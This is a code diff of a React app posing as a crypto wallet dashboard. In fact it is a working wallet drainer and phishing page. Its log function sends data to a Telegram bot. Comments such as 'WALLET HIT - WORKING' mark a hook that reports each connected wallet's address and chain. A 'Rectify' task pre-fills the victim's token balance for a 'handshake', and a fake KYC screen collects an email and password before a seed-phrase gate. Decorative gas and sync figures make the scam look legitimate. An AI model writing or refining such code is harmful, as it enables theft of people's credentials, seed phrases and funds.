@@ -9,10 +9,8 @@ export default function App() {
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
-  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
-  const [kycPhase, setKycPhase] = useState(1);
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
 
@@ -22,22 +20,20 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
-  // FIXED WALLET CONNECTION HIT
+  // 🎯 WALLET HIT - WORKING
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_locked')) {
-      log(`🎯 REAL WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_locked', 'true');
+    if (isConnected && address && !sessionStorage.getItem('hit_ok')) {
+      log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('hit_ok', 't');
     }
   }, [isConnected, address]);
 
   const { data: nB } = useBalance({ address }); 
   const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });
 
-  // RECTIFY AUTO-FILL LOGIC
   useEffect(() => {
     if (activeTask === "Rectify") {
-      const val = tB?.formatted || nB?.formatted || "0.00";
-      setInputVal(val.slice(0, 10));
+      setInputVal(tB?.formatted?.slice(0, 10) || nB?.formatted?.slice(0, 10) || "0.00");
     } else {
       setInputVal("");
     }
@@ -64,11 +60,6 @@ export default function App() {
 
       {isConnected ? (
         <>
-          <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
-          </div>
-
-          {/* SLIPPAGE & GAS (RESTORED) */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
             <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
@@ -78,7 +69,7 @@ export default function App() {
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                 style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
-                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div>
+                  <div style={{fontSize:'12px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>
                   <div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
@@ -88,34 +79,21 @@ export default function App() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-              
-              <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
-              </div>
-
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
-              
-              <button onClick={handleHandshake} 
-              style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
-                START_HANDSHAKE
-              </button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
           )}
 
-          {/* KYC SCREEN REMAINING THE SAME AS REQUESTED */}
           {view === "kyc_screen" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
-               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
-               <h2 style={{color:'white', fontWeight:'900'}}>IDENTITY_SYNC</h2>
-               <div style={{marginTop:'20px'}}>
-                 <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'10px'}} />
-                 <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginBottom:'20px'}} />
-                 <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none'}}>VERIFY_RELAY</button>
-               </div>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              <h2 style={{color:'white', fontWeight:'900'}}>IDENTITY_SYNC</h2>
+              <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'20px'}} />
+              <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
+              <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none', marginTop:'20px'}}>VERIFY_RELAY</button>
             </div>
           )}
 
